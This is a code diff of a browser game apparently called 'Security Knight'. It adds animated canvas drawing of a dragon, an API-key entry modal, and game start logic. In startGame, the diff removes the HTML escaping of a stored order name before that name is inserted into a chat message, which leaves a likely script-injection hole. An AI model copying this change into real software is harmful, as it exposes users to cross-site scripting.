+      var sx = -30 + i * 12, sy = -22 - (i === 2 ? 6 : 0) + bodyWobble * 0.3;
+      dctx.beginPath();
+      dctx.moveTo(sx, sy - 14 - (i===2?4:0));
+      dctx.lineTo(sx - 5, sy + 4);
+      dctx.lineTo(sx + 5, sy + 4);
+      dctx.closePath();
+      dctx.fill();
+    }
+
+    // ── LEGS ──
+    dctx.strokeStyle = '#2A1200';
+    dctx.lineWidth = 8;
+    dctx.beginPath();
+    dctx.moveTo(0, 30);
+    dctx.lineTo(-20, 65 + Math.sin(t * 6) * 8);
+    dctx.lineTo(-30, 80 + Math.sin(t * 6) * 8);
+    dctx.stroke();
+    dctx.beginPath();
+    dctx.moveTo(20, 35);
+    dctx.lineTo(5, 70 + Math.cos(t * 6) * 8);
+    dctx.lineTo(-5, 82 + Math.cos(t * 6) * 8);
+    dctx.stroke();
+    // Claws
+    dctx.strokeStyle = '#555';
+    dctx.lineWidth = 3;
+    [[-30,80],[-5,82]].forEach(function(pos) {
+      for (var c = -1; c <= 1; c++) {
+        dctx.beginPath();
+        dctx.moveTo(pos[0] + c*6, pos[1] + Math.sin(t*6)*8);
+        dctx.lineTo(pos[0] + c*8, pos[1] + 12 + Math.sin(t*6)*8);
+        dctx.stroke();
+      }
+    });
+
+    // ── HEAD & NECK ──
+    // Neck
+    dctx.fillStyle = '#2A1A00';
+    dctx.beginPath();
+    dctx.moveTo(-40, -20);
+    dctx.quadraticCurveTo(-70, -50, -80, -45 + Math.sin(t * 3) * 8);
+    dctx.quadraticCurveTo(-70, -30, -40, -10);
+    dctx.fill();
+
+    // Head
+    var headX = -85, headY = -50 + Math.sin(t * 3) * 8;
+    var headGrad = dctx.createRadialGradient(headX, headY, 3, headX, headY, 32);
+    headGrad.addColorStop(0, '#3A1A00');
+    headGrad.addColorStop(1, '#0A0500');
+    dctx.fillStyle = headGrad;
+    dctx.beginPath();
+    dctx.ellipse(headX, headY, 32, 22, -0.3, 0, Math.PI * 2);
+    dctx.fill();
+
+    // Snout
+    dctx.fillStyle = '#1A0A00';
+    dctx.beginPath();
+    dctx.ellipse(headX - 24, headY + 6, 18, 12, -0.3, 0, Math.PI * 2);
+    dctx.fill();
+
+    // Eye (glowing red)
+    dctx.fillStyle = '#FF0000';
+    dctx.beginPath();
+    dctx.arc(headX - 10, headY - 8, 8, 0, Math.PI * 2);
+    dctx.fill();
+    // Eye glow
+    var eyeGlow = dctx.createRadialGradient(headX-10, headY-8, 0, headX-10, headY-8, 18);
+    eyeGlow.addColorStop(0, 'rgba(255,0,0,0.6)');
+    eyeGlow.addColorStop(1, 'rgba(255,0,0,0)');
+    dctx.fillStyle = eyeGlow;
+    dctx.beginPath();
+    dctx.arc(headX - 10, headY - 8, 18, 0, Math.PI * 2);
+    dctx.fill();
+    // Pupil
+    dctx.fillStyle = '#000';
+    dctx.beginPath();
+    dctx.arc(headX - 11, headY - 7, 3.5, 0, Math.PI * 2);
+    dctx.fill();
+
+    // Horns
+    dctx.fillStyle = '#555';
+    dctx.beginPath();
+    dctx.moveTo(headX - 4, headY - 20);
+    dctx.lineTo(headX + 8, headY - 44);
+    dctx.lineTo(headX + 4, headY - 20);
+    dctx.closePath();
+    dctx.fill();
+    dctx.beginPath();
+    dctx.moveTo(headX - 15, headY - 18);
+    dctx.lineTo(headX - 8, headY - 38);
+    dctx.lineTo(headX - 20, headY - 18);
+    dctx.closePath();
+    dctx.fill();
+
+    // Fire breath
+    if (t > 1.1 && t < 2.3) {
+      var fIntensity = Math.sin((t - 1.1) / 1.2 * Math.PI);
+      var fg2 = dctx.createLinearGradient(headX - 42, headY + 6, headX - 120, headY + 6);
+      fg2.addColorStop(0, 'rgba(255,220,50,' + fIntensity + ')');
+      fg2.addColorStop(0.5, 'rgba(255,80,0,' + (fIntensity * 0.8) + ')');
+      fg2.addColorStop(1, 'rgba(200,0,0,0)');
+      dctx.fillStyle = fg2;
+      var fireW = 80 + Math.sin(t * 12) * 20;
+      dctx.beginPath();
+      dctx.moveTo(headX - 42, headY + 6);
+      dctx.quadraticCurveTo(headX - 80, headY + 6 + Math.sin(t * 8) * 15, headX - 42 - fireW, headY + 18);
+      dctx.quadraticCurveTo(headX - 80, headY + 25 + Math.sin(t * 10) * 10, headX - 42, headY + 25);
+      dctx.closePath();
+      dctx.fill();
+    }
+
     dctx.restore();
   }
 };
-function showDragonAttack(){ dragonAnim.show(); }
 
-function showKeyModal(){ gameState='MODAL'; if(apiKey){ startGame(); } else { document.getElementById('keyModal').classList.remove('hidden'); } }
+function showDragonAttack() {
+  dragonAnim.show();
+}
+
+function escHtml(s){
+  if(!s) return '';
+  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+// ═══════════════════════════════════════════════
+// MODAL & INIT
+// ═══════════════════════════════════════════════
+function showKeyModal(){
+  gameState='MODAL';
+  if(apiKey){
+    startGame();
+  } else {
+    document.getElementById('keyModal').classList.remove('hidden');
+  }
+}
 
 document.addEventListener('DOMContentLoaded',function(){
-  gc=document.getElementById('gc'); ctx=gc.getContext('2d'); resizeCanvas(); window.addEventListener('resize',resizeCanvas);
-  document.getElementById('btnSave').addEventListener('click',function(){ var k=document.getElementById('modalKey').value.trim(); if(!k.startsWith('sk-ant')){ document.getElementById('modalKey').style.borderColor='#E84040'; setTimeout(function(){ document.getElementById('modalKey').style.borderColor=''; },1500); return; } apiKey=k; sessionStorage.setItem('sk4_key',k); document.getElementById('keyModal').classList.add('hidden'); startGame(); });
-  document.getElementById('btnDemo').addEventListener('click',function(){ demoMode=true; document.getElementById('keyModal').classList.add('hidden'); startGame(); });
-  document.getElementById('bdgClose').addEventListener('click',function(){ document.getElementById('bdgModal').classList.add('hidden'); updateHUD(); });
+  gc=document.getElementById('gc');
+  ctx=gc.getContext('2d');
+  resizeCanvas();
+  window.addEventListener('resize',resizeCanvas);
+
+  document.getElementById('btnSave').addEventListener('click',function(){
+    var k=document.getElementById('modalKey').value.trim();
+    if(!k.startsWith('sk-ant')){
+      document.getElementById('modalKey').style.borderColor='#E84040';
+      setTimeout(function(){document.getElementById('modalKey').style.borderColor='';},1500);
+      return;
+    }
+    apiKey=k; sessionStorage.setItem('sk4_key',k);
+    document.getElementById('keyModal').classList.add('hidden');
+    startGame();
+  });
+
+  document.getElementById('btnDemo').addEventListener('click',function(){
+    demoMode=true;
+    document.getElementById('keyModal').classList.add('hidden');
+    startGame();
+  });
+
+  document.getElementById('bdgClose').addEventListener('click',function(){
+    document.getElementById('bdgModal').classList.add('hidden');
+    updateHUD();
+  });
+
   document.getElementById('wsend').addEventListener('click', sendWizard);
-  document.getElementById('winput').addEventListener('keydown',function(e){ if(e.key==='Enter') sendWizard(); });
-  document.querySelectorAll('.hbtn').forEach(function(btn){ btn.addEventListener('click',function(){ askHint(btn.getAttribute('data-hint')); }); });
-  buildMap(); saveState(); initVideoIntro(); requestAnimationFrame(loop);
+  document.getElementById('winput').addEventListener('keydown',function(e){if(e.key==='Enter') sendWizard();});
+
+  document.querySelectorAll('.hbtn').forEach(function(btn){
+    btn.addEventListener('click',function(){askHint(btn.getAttribute('data-hint'));});
+  });
+
+  // Build map
+  buildMap();
+
+  // Run intro
+  runIntro();
+  requestAnimationFrame(loop);
 });
 
 function startGame(){
   gameState='WALKING';
+  var startZone = stoneIdx >= 11 ? 'knight' : stoneIdx >= 6 ? 'squire' : 'paige';
+  Music.start(startZone);
+  // Init order mode if applicable
+  if (gameMode === 'order' && orderData) {
+    document.getElementById('sbOrderTab').style.display = '';
+    document.getElementById('sbSiegeTab').style.display = '';
+    renderOrderPanel();
+    initSiege();
+    addWizMsg('wiz', '⚔️ <strong>Welcome back, ' + orderData.role + ' of ' + orderData.name + '!</strong> Your Order awaits.');
+  }
+
+  // Restore: find last completed stone
   var lastDone=0;
-  for (var i=1;i<=15;i++) if(CHALLENGES[i-1] && state.completed.includes(CHALLENGES[i-1].id)) lastDone=i;
-  stoneIdx=lastDone; charX=WAYPOINTS[stoneIdx].x; charY=WAYPOINTS[stoneIdx].y; camX=Math.max(0,charX-vpW*.4);
-  var startZone = stoneIdx >= 11 ? 'knight' : stoneIdx >= 6 ? 'squire' : 'paige'; Music.start(startZone);
-  if (gameMode === 'order' && orderData) { document.getElementById('sbOrderTab').style.display=''; document.getElementById('sbSiegeTab').style.display=''; renderOrderPanel(); initSiege(); addWizMsg('wiz','⚔️ <strong>Welcome back, '+orderData.role+' of '+escHtml(orderData.name)+'!</strong> Your Order awaits.'); }
+  for(var i=1;i<=15;i++){
+    if(CHALLENGES[i-1]&&state.completed.includes(CHALLENGES[i-1].id)) lastDone=i;
+  }
+
+  stoneIdx=lastDone;
+  charX=WAYPOINTS[stoneIdx].x; charY=WAYPOINTS[stoneIdx].y;
+  camX=Math.max(0,charX-vpW*.4);
   updateHUD(); renderSidebar();
-  if(lastDone===0){ addWizMsg('wiz','⚔️ <strong>Your quest begins!</strong> The knight walks to the first challenge...'); setTimeout(walkToNextStone,1200); }
-  else if(lastDone>=15){ charAction='victory'; gameState='VICTORY'; addWizMsg('wiz','👑 <strong>All 15 challenges complete!</strong> You are a true Security Knight! XP: '+state.xp); setTimeout(showVictory,800); }
-  else { addWizMsg('wiz','⚔️ <strong>Welcome back!</strong> Resuming at stone '+(lastDone+1)+'...'); setTimeout(walkToNextStone,800); }
+
+  if(lastDone===0){
+    addWizMsg('wiz','⚔️ <strong>Your quest begins!</strong> The knight walks to the first challenge...');
+    setTimeout(walkToNextStone,1200);
+  } else if(lastDone>=15){
+    charAction='victory'; gameState='VICTORY';
+    addWizMsg('wiz','👑 <strong>All 15 challenges complete!</strong> You are a true Security Knight! XP: '+state.xp);
+    setTimeout(showVictory,800);
+  } else {
+    addWizMsg('wiz','⚔️ <strong>Welcome back!</strong> Resuming at stone '+(lastDone+1)+'...');
+    setTimeout(walkToNextStone,800);
+  }
 }
 </script>
+
+<script src="sk-story-engine.js"></script>
+
 </body>
 </html>
